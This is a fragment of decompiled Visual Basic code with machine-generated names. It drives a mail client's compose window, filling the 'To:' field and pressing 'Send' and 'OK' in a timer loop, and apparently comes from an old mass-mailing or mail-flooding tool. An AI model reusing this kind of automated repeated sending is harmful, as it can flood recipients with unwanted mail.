l0222 = extfn10F8(l021E, "To:")
l0226 = extfn1168(l0222, 2)
l022A = extfn11A0(l0226, 12, 0, Text1)
l022E = extfn10F8(l021E, "Send")
l01E6 = extfn1168(l022E, 2)
l0232 = fn1480(l01E6)
End If
If  Timer1.Interval = 0 Then GoTo L2349C
If  Check3D1.Value = True Then GoTo 57
If  l01BC = 0 Then GoTo 50
l0236 = extfn10F8(l01BC, "OK")
l023A = fn1480(l0236)
If  Timer1.Interval = 0 Then GoTo L2349C
Next l0174
l023E = extfnFE0(l015A, 16, 0, 0)
L2349C:
l0242 = extfn10F8(l010E, "Compose Mail")
If  l0242 > 0 Then
l0246 = extfnFE0(l0242, 16, 0, 0)
End If
l024C = fn480()
Timer1.Interval = 0
Command3D1.Caption = "Start"
End Sub

Sub Timer2_Timer ()
End Sub

Sub sub3B00 ()
End Sub

Sub sub9980 ()
Unload mail
End Sub
